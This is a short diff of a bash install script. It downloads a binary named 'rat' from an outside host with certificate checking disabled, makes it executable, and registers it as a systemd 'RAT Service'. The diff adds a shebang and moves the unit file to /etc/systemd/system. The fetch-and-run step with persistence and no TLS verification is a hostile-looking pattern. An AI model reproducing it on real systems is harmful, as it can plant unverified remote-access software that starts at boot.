@@ -1,7 +1,8 @@
+#!/bin/bash
 cd /home
 wget --no-check-certificate https://raw.imbytecat.com/imByteCat/fast-rat/master/linux/rat
 chmod +x rat
-cat > "/usr/lib/systemd/system/rat.service" << EOF
+cat > "/etc/systemd/system/rat.service" << EOF
 [Unit]
 Description=RAT Service
 After=network.target syslog.target
